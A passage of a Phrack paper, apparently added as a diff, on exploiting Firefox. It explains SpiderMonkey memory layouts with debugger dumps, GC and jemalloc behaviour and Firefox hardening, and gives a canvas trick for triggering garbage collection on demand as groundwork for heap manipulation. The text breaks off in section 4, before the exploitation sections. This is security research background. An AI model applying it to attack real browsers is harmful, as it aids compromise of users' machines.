@@ -1,0 +1,2383 @@
+                           ==Phrack Inc.==
+
+               Volume 0x0f, Issue 0x45, Phile #0x0e of 0x10
+
+|=-----------------------------------------------------------------------=|
+|=----------------=[ OR'LYEH? The Shadow over Firefox ]=-----------------=|
+|=-----------------------------------------------------------------------=|
+|=----------------------------=[ argp ]=---------------------------------=|
+|=-----------------------=[ argp@grhack.net ]=---------------------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Table of contents
+
+1 - Introduction
+2 - Firefox and SpiderMonkey internals
+  2.1 - Representation in memory
+  2.2 - Generational garbage collection (GGC)
+  2.3 - jemalloc (and GGC)
+3 - Firefox's hardening features
+  3.1 - PresArena
+  3.2 - jemalloc heap sanitization
+  3.3 - Garbage collection
+  3.4 - Sandbox
+4 - The shadow (over Firefox) utility
+5 - Exploitation
+  5.1 - ArrayObjects inside ArrayObjects
+  5.2 - jemalloc feng shui
+  5.3 - xul.dll base leak and our location in memory
+  5.4 - EIP control
+  5.5 - Arbitrary memory leak
+  5.6 - Use-after-free bugs
+6 - Conclusion
+7 - References
+8 - Source code
+
+--[ 1 - Introduction
+
+In this paper I will elaborate and expand on my Infiltrate 2015 talk of
+the same title [INF]. Even a full hour-long conference talk is hardly
+enough to present all the necessary background details or the full
+technical depth of an exploitation subject. Therefore, I was quite happy
+when the Phrack Staff approached me for writing a paper based on my
+conference talk.
+
+My goal for this paper is to define a reusable exploitation methodology
+against the latest versions of the Mozilla Firefox browser in the context
+of the modern protections provided by most operating systems. The term
+'exploitation' here refers to leveraging memory corruption
+vulnerabilities (of different types, i.e, buffer overflows, use-after-
+frees, type confusions). By 'reusable methodology' I mean an attack
+pattern that can be applied towards the exploitation of most
+vulnerabilities and vulnerability classes. Although the material in this
+paper are from the Windows version of Firefox, to the best of my
+knowledge the included techniques can be used on all platforms supported
+by Firefox.
+
+Specifically, for all techniques and included code excerpts I have used
+the latest version of Firefox (41.0.1 at the time of writing) on Windows
+8.1 x86-64. Please note that Firefox stable on Windows (even on a x86-64
+system) is x86.
+
+--[ 2 - Firefox and SpiderMonkey internals
+
+I will start by explaining some Firefox and SpiderMonkey internals that
+are required for the exploitation methodology. SpiderMonkey (Firefox's
+JavaScript engine) uses C++ variables of type JS::Value (or simply jsval)
+to represent strings, numbers (both integers and doubles), objects (
+including arrays and functions), booleans, and the special values null
+and undefined [JSV]. When in JavaScript (JS) a string for example is
+assigned to a variable or an object's attribute, the runtime must be able
+to query its type. Therefore, jsvals must follow a representation that
+encodes both values and types. SpiderMonkey uses the 64-bit IEEE-754
+encoding [IFP] for this purpose. Specifically, jsval doubles use the full
+64 bits for their value. All other jsvals (integers, strings, etc) are
+encoded with 32 bits for a tag specifying their type and 32 bits for
+their value. In Firefox's source code we can find the constants for the
+jsval types at js/public/Value.h:
+
+#define JSVAL_TYPE_DOUBLE    ((uint8_t)0x00)
+#define JSVAL_TYPE_INT32     ((uint8_t)0x01)
+#define JSVAL_TYPE_UNDEFINED ((uint8_t)0x02)
+#define JSVAL_TYPE_BOOLEAN   ((uint8_t)0x03)
+#define JSVAL_TYPE_MAGIC     ((uint8_t)0x04)
+#define JSVAL_TYPE_STRING    ((uint8_t)0x05)
+#define JSVAL_TYPE_SYMBOL    ((uint8_t)0x06)
+#define JSVAL_TYPE_NULL      ((uint8_t)0x07)
+#define JSVAL_TYPE_OBJECT    ((uint8_t)0x08)
+
+These constants are then used to get the 32-bit jsval tags for the
+different types:
+
+#define JSVAL_TAG_CLEAR ((uint32_t)(0xFFFFFF80))
+#define JSVAL_TAG_INT32 ((uint32_t)(JSVAL_TAG_CLEAR | JSVAL_TYPE_INT32))
+#define JSVAL_TAG_UNDEFINED ((uint32_t)(JSVAL_TAG_CLEAR | \
+                              JSVAL_TYPE_UNDEFINED))
+#define JSVAL_TAG_STRING ((uint32_t)(JSVAL_TAG_CLEAR | JSVAL_TYPE_STRING))
+#define JSVAL_TAG_SYMBOL ((uint32_t)(JSVAL_TAG_CLEAR | JSVAL_TYPE_SYMBOL))
+#define JSVAL_TAG_BOOLEAN ((uint32_t)(JSVAL_TAG_CLEAR | \
+                              JSVAL_TYPE_BOOLEAN))
+#define JSVAL_TAG_MAGIC ((uint32_t)(JSVAL_TAG_CLEAR | JSVAL_TYPE_MAGIC))
+#define JSVAL_TAG_NULL ((uint32_t)(JSVAL_TAG_CLEAR | JSVAL_TYPE_NULL))
+#define JSVAL_TAG_OBJECT ((uint32_t)(JSVAL_TAG_CLEAR | JSVAL_TYPE_OBJECT))
+
+When the SpiderMonkey runtime queries a jsval for its type, if its 32-bit
+tag value is greater than 0xFFFFFF80 (the JSVAL_TAG_CLEAR define from
+above) then the 64 bits are interpreted as a jsval of the corresponding
+type. If the tag value is less or equal to 0xFFFFFF80 then the 64 bits
+are interpreted as an IEEE-754 double. An important note at this point
+that I will refer to later on is that there is no IEEE-754 64-bit double
+that corresponds to a 32-bit encoded value greater than 0xFFF00000.
+
+Apart from jsvals, SpiderMonkey also uses complex objects of type JSObject
+[JSO] to represent various JavaScript objects (jsobjects). In essence
+these are mappings from names (object properties) to values. To avoid
+expensive dictionary lookups from these properties to their corresponding
+values (which are stored in an array of the jsobject) SpiderMonkey uses
+what is called a shape. Shapes are structural descriptions that point
+directly from property names to the array indexes that hold their values.
+
+The JSObject class uses the NativeObject class for its internal
+implementation (to be precise the NativeObject class inherits from the
+JSObject class). These complex objects also contain an inline dynamically-
+sized (but up to a limit) array that is used to store named properties,
+and elements of JavaScript arrays and typed arrays. The first (named
+properties) are indexed by the slots_ pointer, and the latter (array
+elements) by the elements_ pointer. The actual storage can be either the
+inline jsobject storage or a dynamically allocated region on the heap.
+
+Moreover, jsobject arrays have a header; this header is described by the
+ObjectElements class. The definition of the JSObject class can be found at
+js/src/jsobj.h, and those of NativeObject and ObjectElements at
+js/src/vm/NativeObject.h. Below I will discuss all of them together
+(think of it as pseudocode) and only their relevant to the paper fields:
+
+    class NativeObject : public JSObject
+    {
+        /*
+         * From JSObject; structural description to avoid dictionary
+         * lookups from property names to slots_ array indexes.
+         */
+        js::HeapPtrShape shape_;
+
+        /*
+         * From JSObject; the jsobject's type (unrelated to the jsval
+         * type I described above).
+         */
+        js::HeapPtrTypeObject type_;
+
+        /*
+         * From NativeObject; pointer to the jsobject's properties'
+         * storage.
+         */
+        js::HeapSlot *slots_;
+
+        /*
+         * From NativeObject; pointer to the jsobject's elements' storage.
+         * This is used by JavaScript arrays and typed arrays. The
+         * elements of JavaScript arrays are jsvals as I described them
+         * above.
+         */
+        js::HeapSlot *elements_;
+
+        /*
+         * From ObjectElements; how are data written to elements_ and
+         * other metadata.
+         */
+        uint32_t flags;
+
+        /*
+         * From ObjectElements; number of initialized elements, less or
+         * equal to the capacity (see below) for non-array jsobjects, and
+         * less or equal to the length (see below) for array jsobjects.
+         */
+        uint32_t initializedLength;
+
+        /*
+         * From ObjectElements; number of allocated slots (for object
+         * properties).
+         */
+        uint32_t capacity;
+
+        /*
+         * From ObjectElements; the length of array jsobjects.
+         */
+        uint32_t length;
+    };
+
+In the following sections of this paper I am going to refer back to this
+as 'jsobject' (or the 'jsobject class'), which although isn't technically
+correct (as I have explained above) will make the discussion simpler.
+
+----[ 2.1 - Representation in memory
+
+In order to get a better insight, let's look at the representation of
+jsvals and jsobjects in memory. We have the following JavaScript code:
+
+    var arr = new Array();          // an array jsobject (ArrayObject)
+
+    arr[0]  = 0x40414140;           // [A] an integer
+    arr[1]  = "Hello, Firefox!";    // [B] a string
+    arr[2]  = 0x42434342;
+    arr[3]  = true;                 // [C] a boolean
+    arr[4]  = 0x44454544;
+    arr[5]  = new Array(666);       // [D] an object
+
+    // add some elements to the array
+    arr[5][0] = 666;
+    arr[5][1] = "sixsixsix";
+    arr[5][2] = 0.666;
+    arr[5][3] = false;
+    arr[5][4] = new Array(666);
+
+    arr[6]  = 0x46474746;
+    arr[7]  = null;
+    arr[8]  = 0x48494948;
+
+    // [E] a typed array jsobject holding unsigned 32-bit integers
+    arr[9]  = new Uint32Array(128);
+
+    // let's fill the typed array with some content
+    // total size: 128 * 4 == 512
+    for(var j = 0; j < 128; j += 2)
+    {
+        arr[9][j]     = 0x61636361;
+        arr[9][j + 1] = 0x71737371;
+    }
+
+    arr[10] = 0x50515150;
+    arr[11] = 1.41424344;           // [F] a double
+    arr[12] = 0x52535352;
+
+    // [G] and a bigger string
+    arr[13] = "Hello, Firefox, and hello again";
+
+In WinDbg we search for our first integer marker value, that is 40414140,
+and then we inspect the elements of the array we have defined:
+
+    0:000> s -d 0 0x0 l?0xffffffff 40414140
+    09e10980  40414140 ffffff81 0f352880 ffffff85  @AA@.....(5.....
+    09e10a00  40414140 ffffff81 0f352880 ffffff85  @AA@.....(5.....
+
+The reason of finding our marker value twice will become clear below. Now
+let's do a memory dump from a few dwords before the found value; I am
+going to annotate the dump from WinDbg to make the discussion easier to
+follow:
+
+    0:000> dd 09e10980-20 l?48
+
+    [ Our arr ArrayObject ]
+              shape_   type_    slots    elements
+    09e10960  0eed89a0 0f3709b8 00000000 09e10a00
+
+    [ Metadata of the old elements,
+      the default length of ArrayObjects is 6 ]
+              flags    initlen  capacity length
+    09e10970  00000000 00000006 00000006 00000006
+
+    [ Old elements' address ]
+    09e10980  40414140 ffffff81 0f352880 ffffff85
+    09e10990  42434342 ffffff81 00000001 ffffff83
+    09e109a0  44454544 ffffff81 09e109b0 ffffff88
+    09e109b0  0eed89a0 0f3709e8 00000000 0c94e010
+    09e109c0  00000000 00000000 00000000 0000029a
+    09e109d0  0eed89a0 0f370a30 00000000 0d177010
+    09e109e0  00000000 00000000 00000000 0000029a
+
+    [ Metadata of relocated elements,
+      the length of our new ArrayObject is 0xe, or 14 in decimal ]
+              flags    initlen  capacity length
+    09e109f0  00000000 0000000e 0000000e 0000000e
+
+    [ New elements' address ]
+              int32 jsval [A]   string jsval [B]
+    09e10a00  40414140 ffffff81 0f352880 ffffff85
+
+                                bool jsval [C]
+    09e10a10  42434342 ffffff81 00000001 ffffff83
+
+                                object jsval (ArrayObject) [D]
+    09e10a20  44454544 ffffff81 09e109b0 ffffff88
+
+    09e10a30  46474746 ffffff81 00000000 ffffff87
+
+                                object jsval (typed array) [E]
+    09e10a40  48494948 ffffff81 12634520 ffffff88
+
+                                double jsval [F]
+    09e10a50  50515150 ffffff81 bab61ee0 3ff6a0bd
+
+                                string jsval [G]
+    09e10a60  52535352 ffffff81 0eef9730 ffffff85
+
+At the start of the memory dump (at 09e10960) we can see the metadata of
+our arr ArrayObject; the shape_, type_, slots and elements pointers. The
+slots pointer is NULL since our jsobject has no named properties. The
+elements pointer points to the jsval contents of the array at 09e10a00.
+These are actually the relocated contents of the array. At address
+09e10970 we can see the original metadata of the elements (the default
+length of an array when not specified is always 6), and at 09e10980 the
+original contents. The elements (along with their metadata) were
+relocated while we were adding contents to the arr array.
+
+The elements pointer after the relocation points to 09e10a00 where the
+jsval contents begin. Four dwords before that, at 09e109f0, we have their
+metadata; flags, initializedLength (or initlen), capacity, and length. As
+expected, initlen, capacity, and length are all 0xe.
+
+At 09e10a00 there is our integer marker value 40414140 and at 09e10a04 its
+32-bit tag of ffffff81 denoting as an integer jsval [A]. At 09e10a08 we
+can see the string jsval for [B]. Based on a) whether the underlying
+platform is x86 or x86-64, b) the length of the jsval string, and c)
+whether it is plain ASCII or unicode, the content bytes of the string are
+either inline or not. On x86 the maximum length for an inline ASCII
+string is 7 and 3 for unicode; on x86-64 it is 15 for ASCII and 7 for
+unicode. Our [B] string has length 15 (0xf) therefore it is inlined.
+Let's see the contents of the address that the [B] string jsval points to:
+
+    0:000> dd 0f352880
+              flags    length   string's contents
+    0f352880  0000005d 0000000f 6c6c6548 46202c6f
+
+    0f352890  66657269 0021786f 00737365 00000004
+
+    0:000> db 0f352880
+    0f352880  5d 00 00 00 0f 00 00 00-48 65 6c 6c 6f 2c 20 46  ]..Hello, F
+    0f352890  69 72 65 66 6f 78 21 00-65 73 73 00 04 00 00 00  irefox!.ess
+
+At 0f352880 it's the start of the metadata of our inline [B] string; the
+flags (0x5d), the length (0xf == 15 in decimal) and then at 0f352888 the
+ASCII contents of [B].
+
+In contrast, the string jsval at 09e10a68 [G] is not inline. Again, the
+tag value of [G] is ffffff85 denoting as a string, and it's value points
+to 0eef9730:
+
+    0:000> dd 0eef9730
+              flags    length   pointer to string's contents
+    0eef9730  00000049 0000001f 0bcba840 00000000
+
+    0:000> dd 0bcba840
+    0bcba840  6c6c6548 46202c6f 66657269 202c786f
+    0bcba850  20646e61 6c6c6568 6761206f 006e6961
+
+    0:000> db 0bcba840
+
+    0bcba840 \
+    48 65 6c 6c 6f 2c 20 46-69 72 65 66 6f 78 2c 20  Hello, Firefox,
+
+    0bcba850 \
+    61 6e 64 20 68 65 6c 6c-6f 20 61 67 61 69 6e 00  and hello again.
+
+At 0eef9730 we have the flags (0x49), length (0x1f == 31 in decimal), and
+at 0eef9738 a pointer to the actual bytes contents of the string (at
+0bcba840). Actually SpiderMonkey strings are a lot more interesting and
+useful, so I refer the interested reader to js/src/vm/String.h. However,
+for the purposes of this paper the above details are adequate.
+
+At 09e10a28 there is the [D] ArrayObject we have instantiated with a
+capacity of 666 (or 0x29a in hex); its tag is ffffff88 denoting it as an
+object, and its value is the address 09e109b0, where we can see the
+ArrayObject metadata as we have talked about them before:
+
+    0:000> dd 09e109b0
+              shape_   type_    slots    elements
+    09e109b0  0eed89a0 0f3709e8 00000000 0c94e010
+
+              flags    initlen  capacity length
+    09e109c0  00000000 00000000 00000000 0000029a
+
+    0:000> dd 0c94e010-10
+              flags    initlen  capacity length
+    0c94e000  00000000 00000005 0000029a 0000029a
+
+              arr[5][0] = 666;  arr[5][1] = "sixsixsix";
+    0c94e010  0000029a ffffff81 0eed78a0 ffffff85
+
+    0c94e020  3b645a1d 3fe54fdf 00000000 ffffff83
+    0c94e030  09e109d0 ffffff88 5a5a5a5a 5a5a5a5a
+
+The elements pointer of the [D] ArrayObject points to 0c94e010 where we
+can see the first element of this array, i.e. arr[5][0], namely the
+integer jsval 0x29a (or 666 in decimal). At 0c94e000 there are the
+metadata associated with these elements.
+
+Here we can clearly see the difference between the initializedLength, the
+capacity, and the length of an ArrayObject. The initializedLength and the
+capacity from the metadata at 09e109b0 are both zero, while it's length is
+0x29a; this is the case since at [D] we simply declared an ArrayObject
+with a length of 0x29a without actually adding any elements to it. Then
+we added five elements (arr[5][0] to arr[5][4]), and the new
+initializedLength became 5, while the capacity became equal to length,
+i.e. 0x29a (all these from the metadata at 0c94e000).
+
+Before we move on, let's also look at SpiderMonkey typed arrays since we
+will use them in our attack methodology later on. Typed arrays are a very
+useful JavaScript feature since they allow us to situate on the heap
+arbitrary sized constructs of controlled content (to arbitrary byte
+granularity). Previous Firefox attacks, like [P2O] and [REN], relied on
+the fact that SpiderMonkey used to situate the actual content (data) and
+the corresponding metadata of typed arrays contiguously in memory.
+Unfortunately this is no longer the case; the GC tenured heap and the
+jemalloc heap (both of which I will explain shortly) keep these
+separated, even when we try to force such a layout. However, typed arrays
+remain very useful.
+
+At [E] we instantiate a Uint32Array object, i.e. a typed array jsobject
+holding unsigned 32-bit integers, with an initial length of 128, whose
+object-type jsval we can find at address 09e10a48; its value is the
+address 12634520. There we see the Uint32Array object, starting with its
+metadata (for example, at 12634538 its length of 0x80, or 128 in
+decimal), and at 12634548 the pointer to the actual buffer contents of
+the typed array (0dd73600).
+
+    0:000> dd 12634520
+    12634520  0af6c5c8 0f370e80 00000000 7475a930
+    12634530  126344f0 ffffff88 00000080 ffffff81
+    12634540  00000000 ffffff81 0dd73600 ffffff81
+    12634550  00000000 00000000 00000000 00000000
+
+    0:000> dd 0dd73600
+    0dd73600  61636361 71737371 61636361 71737371
+    0dd73610  61636361 71737371 61636361 71737371
+    0dd73620  61636361 71737371 61636361 71737371
+    0dd73630  61636361 71737371 61636361 71737371
+    0dd73640  61636361 71737371 61636361 71737371
+    0dd73650  61636361 71737371 61636361 71737371
+    0dd73660  61636361 71737371 61636361 71737371
+    0dd73670  61636361 71737371 61636361 71737371
+
+As expected, the contents of the typed array at 0dd73600 are precisely
+what we assigned in our code. The buffer that holds these contents is
+allocated on the heap and its size is four times the number of uint32
+elements we assigned to the typed array (since each element is four bytes
+long). So, for our [E] typed array, its contents buffer at 0dd73600 is
+512 bytes long (4 * 128 == 512).
+
+----[ 2.2 - Generational garbage collection (GGC)
+
+Since release 32.0 [F32] Firefox has a new garbage collection (GC)
+implementation enabled by default (on all its supported operating
+systems) called 'generational garbage collection' (GGC). In GGC there are
+two separate heaps; a) the nursery on which most SpiderMonkey objects are
+allocated, and b) the tenured or major heap which is more or less the old
+(before release 32.0) normal SpiderMonkey GC heap. When the nursery
+becomes full (or some other event happens) we have the so-called minor GC
+pass. During this, all the temporary short-lived JavaScript objects on
+the nursery are collected and the memory they were occupying becomes
+again available to the nursery. On the other hand, the JavaScript objects
+on the nursery that are reachable in the heap graph (i.e. alive) are
+moved to the tenured heap (which also makes the memory they were
+occupying available to the nursery). Once an object is moved to the
+tenured heap, during a minor GC pass, it is checked for outgoing pointers
+to other objects on the nursery heap. Such objects are moved from the
+nursery to the tenured heap as well, since they are actually reachable.
+This iterative process continues until all reachable objects
+are moved from the nursery to the tenured heap, and the memory they were
+occupying is set to available for the nursery. This generational (also
+called 'moving') garbage collection approach has resulted in impressive
+performance gains for SpiderMonkey since most JavaScript allocations are
+indeed short-lived.
+
+To make it clear how all the above fit in the context of the Firefox
+browser, I should talk about JSRuntime [JSR]. An instantiated JSRuntime
+object (see js/src/vm/Runtime.cpp for the class) holds all JavaScript
+variables, objects, scripts, etc. SpiderMonkey as compiled for Firefox is
+single-threaded by default, therefore Firefox usually has just one
+JSRuntime. However, (web) workers can be launched/created and each one of
+them has its own JSRuntime. Each different JSRuntime has one separate GGC
+heap (nursery and tenured), and they don't share heap memory. Furthermore
+they are isolated from each other; one JSRuntime cannot access objects
+allocated by a different JSRuntime.
+
+The nursery has a hardcoded size of 16 megabytes allocated with
+VirtualAlloc() (or with mmap() on Linux). It operates as a standard bump
+allocator; a pointer is maintained that points to the first unallocated
+byte in the nursery memory area. To make an allocation of X bytes, first
+there is a check if there are X bytes available in the nursery. If there
+are, X is added to the pointer (the "bump") and its previous value is
+returned to service the allocation request. If there aren't X bytes
+available, a minor GC is triggered. During this GC pass the new object is
+moved to the tenured heap, and if its slots or elements (see section 2.1)
+are above a certain number they are moved to the jemalloc-managed heap.
+
+The tenured heap (you may also see it referred to as 'major' or simply
+'GC' heap in Firefox's code base) has its own metadata and algorithms to
+manage memory. These are distinct from both the nursery and the jemalloc
+heaps. Apart from being the heap for JavaScript objects that survived a
+nursery GC pass, some allocations go directly on it bypassing the
+nursery. Examples of such cases are known long-lived objects (e.g. global
+objects), function objects (due to JIT requirements), and objects with
+finalizers (i.e. most DOM objects). I will not go into more details for
+the tenured heap since they are not relevant to the exploitation
+methodology.
+
+----[ 2.3 - jemalloc (and GGC)
+
+In this section I will only discuss the necessary jemalloc knowledge you
+require in order to follow the analysis in section 5. For a more detailed
+treatise I refer you to another Phrack paper which is still applicable to
+the current state of jemalloc [PSJ].
+
+jemalloc is a bitmap allocator designed for performance and not primarily
+memory utilization. One of its major design goals is to situate allocations
+contiguously in memory. The latest version of jemalloc is 4.0.0 at this
+time, but Firefox includes a version forked from major release 2. Firefox's
+fork is called mozjemalloc in the source tree, but it doesn't include any
+significant changes from jemalloc 2. It is used in Firefox for allocations
+that become too big (based on some limits I will discuss shortly) for the
+tenured heap. However, there are some exceptions; certain allocations
+triggerable from JavaScript can bypass both the nursery and the tenured
+heap and go directly to the jemalloc-managed heap. I will not discuss this
+further, so you can consider it an exercise ;)
+
+In jemalloc memory is divided into regions which are categorized according
+to their size. Specifically, the size categories, called 'bins', in Firefox
+are 2, 4, 8, 16, 32, 48, ..., 512, 1024, up to inclusive 2048. malloc()
+requests larger than 2048 bytes are handled differently and are not in
+scope for this paper. Each bin (or size category) is associated with
+several 'runs'; these are the actual containers for the regions. A run can
+span one or more virtual memory pages which are divided into regions of the
+bin size that the run belongs to. Bins have the metadata for their runs and
+through them free regions are located. The following diagram is a
+simplified version of the original one from [PSJ] and summarizes the above
+notes.
+
+.--------------------------------. .--------------------------------.
+|                                | |                                |
+|   Run #0         Run #1        | |   Run #0         Run #1        |
+| .-------------..-------------. | | .-------------..-------------. |
+| |             ||             | | | |             ||             | |
+| |   Page      ||   Page      | | | |   Page      ||   Page      | |
+| | .---------. || .---------. | | | | .---------. || .---------. | |
+| | |         | || |         | | | | | |         | || |         | | | ...
+| | | Regions | || | Regions | | | | | | Regions | || | Regions | | |
+| | |[] [] [] | || |[] [] [] | | | | | |[] [] [] | || |[] [] [] | | |
+| | | ^     ^ | || |         | | | | | | ^     ^ | || |         | | |
+| | `-|-----|-' || `---------' | | | | `-|-----|-' || `---------' | |
+| `---|-----|---'`-------------' | | `---|-----|---'`-------------' |
+`-----|-----|--------------------' `-----|-----|--------------------'
+      |     |                            |     |
+      |     |                            |     |
+  .---|-----|----------.             .---|-----|----------.
+  |   |     |          |             |   |     |          |
+  | free regions' list | ...         | free regions' list | ...
+  |                    |             |                    |
+  `--------------------'             `--------------------'
+  bin of size category 8             bin of size category 16
+
+Allocation requests (i.e. malloc() calls) are rounded up and assigned to a
+bin. Then, through the bin's free regions' metadata, a run with a free
+region is located. If none is found, a new run is allocated and assigned
+to the specific bin. Therefore, this means that objects of different types
+but with similar sizes that are rounded up to the same bin are contiguous
+in the jemalloc heap. Another interesting feature of jemalloc is that it
+operates in a last-in-first-out (LIFO) manner (see [PSJ] for the free
+algorithm); a free followed by a garbage collection and a subsequent
+allocation request for the same size, most likely ends up in the freed
+region.
+
+At this point let's utilize an example to see how the jemalloc heap is
+used in Firefox along with the GGC heaps, namely nursery and tenured. In
+the diagram below the nursery heap is nearly full and we have an
+allocation request for a JSObject with an N number of slots.
+
+...........................................................................
+ +-+            +-++-------+           +-------+        :
+ |T| Temporary  |J|| slots | Survivor  |       | Free   :        jemalloc
+ | | object     | ||   N   | JSObject  |       | memory :     +-----------+
+ +-+            +-++-------+  + slots  +-------+        :     | +-------+ |
+....................................................... :     | | slots | |
+                                                        :     | |   N   | |
+                                        Before minor GC :     | +-------+ |
+                          JSObject      --------------- :     |    ^  ^   |
+                          allocation                    :     |    |  |   |
+                          request   +-++-------+        :     |    |  |   |
+Nursery doesn't have                |J|| slots |        :     |    |  |   |
+free memory for         +----------+| ||   N   |+------------------+  |   |
+JSObject + its slots    |           +-++-------+        :     |       |   |
+      +---------------+ |                               :     |       |   |
+                      | |                               :     |       |   |
+                      v v                               :     |       |   |
+ +-----------------------+   +-----------------------+  :     |       |   |
+ |+-++-++-++-++-++-++-++-+   |+-++-+                 |  :     |       |   |
+ ||T||T||T||T||T||T||T||J|   ||J||J|                 |  :     |       |   |
+ || || || || || || || || |   || || |                 |  :     |       |   |
+ |+-++-++-++-++-++-++-++-+   |+-++-+                 |  :     |       |   |
+ +-----------------------+   +-----------------------+  :     |       |   |
+  Nursery               +     Tenured                   :     |       |   |
+                        |                               :     |       |   |
+                        |                               :     |       |   |
+                        +------------+                  :     |       |   |
+                                     |                  :     |       |   |
+.....................................|................. :     |       |   |
+                                     |                  :     |       |   |
+  First unallocated nursery byte     |  After minor GC  :     |       |   |
+  +-----+                            |  --------------  :     +-------|---+
+  |                                  |                  :             |
+  v                                  v                  :             |
+ +-----------------------+   +-----------------------+  :             |
+ |                       |   |+-++-++-+              |  :             |
+ |                       |   ||J||J||J|+------------------------------+
+ |                       |   || || || |              |  :  slots_ pointer
+ |                       |   |+-++-++-+              |  :
+ +-----------------------+   +-----------------------+  :
+  Nursery                     Tenured                   :
+...........................................................................
+
+The JSObject itself can fit (or not, doesn't affect the rest of the
+events) in the free space of the nursery, but its slots cannot. So, the
+JSObject is placed on the nursery and since it becomes full, a minor GC is
+triggered. If it couldn't fit in the nursery a minor GC would also be
+triggered. During this GC and assuming that the JSObject is a survivor
+object, i.e. not a temporary one, it is moved from the nursery to the
+tenured heap (or placed directly there if it couldn't fit in the nursery
+in the first place). If the number of its slots N is greater than a
+certain number (more on this later), they are not placed on the tenured
+heap with the object itself. Instead, a new allocation for the size of the
+N slots is made on the jemalloc heap, and the slots are placed there. Then
+the slots_ pointer of the jsobject stores the address of the jemalloc heap
+region that contains the slots.
+
+--[ 3 - Firefox's hardening features
+
+Firefox has some security hardening features that are useful to know if you
+are doing or plan to do any exploit development for it. I will try to list
+them all here to give you the references to start digging from, but I will
+only expand on those that affect our goal for this paper.
+
+----[ 3.1 - PresArena
+
+PresArena is Gecko's specialized heap for CSS box objects (Gecko is
+Firefox's layout engine). When a CSS box object is freed, the free
+PresArena heap 'slot' is added to a free list based on its type. This means
+that PresArena maintains separate free heap 'slot' lists for each different
+CSS box object type. An allocation request is serviced from the free list
+of the type of objects it is trying to allocate. This basically means that
+for CSS box objects PresArena implements type-safe memory reuse, mostly
+killing use-after-free exploitation. I say 'mostly' because in some cases a
+use-after-free bug can still be exploitable via same-object-type trickery,
+like playing with attributes' values for example.
+
+PresArena also services types of objects that related to CSS box objects
+but are not. The free lists of these objects are per size and not per type.
+This of course means that use-after-free bugs for these object types are
+exploitable as usual.
+
+The code for PresArena is at layout/base/nsPresArena.{h, cpp}.
+
+----[ 3.2 - jemalloc heap sanitization
+
+Since jemalloc rounds up allocation requests to the closest size category
+(bin), it is possible that a small object may be assigned to the same
+region that a bigger object was occupying before being freed (both objects
+smaller or equal to the size category of course). Therefore, in such a case
+we could use the small object to read back memory left by the bigger
+object. This could reveal DLL pointers and could help in bypassing ASLR. To
+avoid this jemalloc sanitizes regions after they are freed. Current Firefox
+versions use the value e5e5e5e5 to sanitize; older versions used a5a5a5a5.
+This hardening feature also makes some uninitialized memory bugs
+unexploitable. In any case, if you're fuzzing Firefox these are nice values
+to look for in crash logs.
+
+----[ 3.3 - Garbage collection
+
+Being able to trigger a garbage collection on demand is fundamental when
+trying to create specific object layouts on the heap. Firefox provides no
+unprivileged JavaScript API to do this. Although not having an on-demand
+GC API call is not listed as a hardening feature, it is clear that Firefox
+developers actively try to remove direct execution paths from unprivileged
+JavaScript functions to GC. A GC can be triggered for a variety of reasons;
+Firefox has these divided into two major categories, those related to the
+JavaScript engine and those that aren't. The second category includes
+reasons related to the layout engine (for example frame refreshing), as
+well as ones more general to the browser (for example when the main process
+exits). You can find the names of all the reasons at js/public/GCAPI.h.
+These are the start for finding ways to trigger a GC on demand from
+unprivileged JavaScript code.
+
+A simple one to get you started is TOO_MUCH_MALLOC. If you search for this
+in Firefox's code and backtrace it with your favorite code reading tool,
+you will conclude to the following execution path:
+
+    dom::CanvasRenderingContext2D::EnsureTarget()
+     +
+     |     
+     +--> JS_updateMallocCounter()
+           +
+           |
+           +--> GCRuntime::updateMallocCounter()
+                 +
+                 |
+                 +--> GCRuntime::onTooMuchMalloc()
+                       +
+                       |
+                       +--> triggerGC(JS::gcreason::TOO_MUCH_MALLOC)
+
+After reading dom::CanvasRenderingContext2D::EnsureTarget(), which is in
+the file dom/canvas/CanvasRenderingContext2D.cpp, we can easily figure out
+how to reach it:
+
+    var my_canvas = document.createElement("canvas");
+    my_canvas.id = "my_canvas";
+    my_canvas.width = "100";
+    my_canvas.height = "115";
+
+    document.body.appendChild(my_canvas);
+
+    for(var i = 0; i < 10; i++)
+    {
+        var my_context = my_canvas.getContext("2d");
+        my_canvas.width = 36666;
+        my_context.fillRect(21, 11, 66, 60);
+    }
+
+You can find many others; some more reliable, some less, just read the
+code. Another simple one is to repeatedly create strings and append them to
+a DOM node; see the archive for this example. Just keep in mind that you
+may have to tweak some parameters, like the number of repetitions, the size
+of strings, etc, in order to get it to work on as many as possible
+different systems with different characteristics (available RAM, Firefox
+versions).
+
+----[ 3.4 - Sandbox
+
+I will only be discussing Firefox's sandbox on Windows; the Linux and OS X
+implementations are based on different technologies, seccomp and Seatbelt,
+but aim to achieve similar goals. All the code is available at
+security/sandbox/{win, linux, mac}.
+
+On Windows, Firefox is using the code of the Chromium sandbox. In short,
+there is a parent process (broker) that is responsible for starting
+sandboxed children processes (targets). The communication between the two
+is implemented via a Firefox-specific C++ IPC called IPDL (Inter-process
+communication Protocol Definition Language). There are three different
+sandbox policies for children processes implemented, a) for layout content,
+b) for media playback, and c) for other plugins. These are implemented by
+the following functions, a) SetSecurityLevelForContentProcess(),
+b) SetSecurityLevelForGMPlugin(), and c) SetSecurityLevelForPluginProcess()
+respectively. You can find their implementations at
+security/sandbox/win/src/sandboxbroker/sandboxBroker.cpp.
+
+Flash in Firefox is an out-of-process plugin. This means that Firefox
+launches an executable called plugin-container.exe which then loads the
+Flash plugin, sandboxed by Flash's own "protected mode". On Windows this
+means that it is a low integrity process, has restricted access token
+capabilities, is not allowed to launch new processes, etc. Firefox plans to
+stop enabling Flash's protected mode and place Flash under the above
+Chromium-based sandbox as well, but this is not the case currently
+(41.0.1).
+
+--[ 4 - The shadow (over Firefox) utility
+
+I initially re-designed unmask_jemalloc [UNJ] (a GDB/Python tool we have
+written with huku) with a modular design to support all three main
+debuggers and platforms (WinDBG, GDB and LLDB). I renamed the tool to
+shadow when I added Firefox/Windows/WinDBG-only features.
+
+The following is an overview of the new design (read the arrows as
+"imports"). The goal is to have all debugger-dependent code in the *_driver
+and *_engine modules.
+
+---------------------------------------------------------------------------
+
+                                                        debugger-required
+                                                        frontend (glue)
+
+
+    +------------+     +-------------+     +-------------+
+    | gdb_driver |     | lldb_driver |     | pykd_driver |
+    +------------+     +-------------+     +-------------+
+          ^                   ^                   ^
+          |                   |                   |
+----------+-------------------+-------------------+------------------------
+          |                   |                   |   
+          |                   +--------+          |
+          +-----------------------+    |    +-----+      core logic
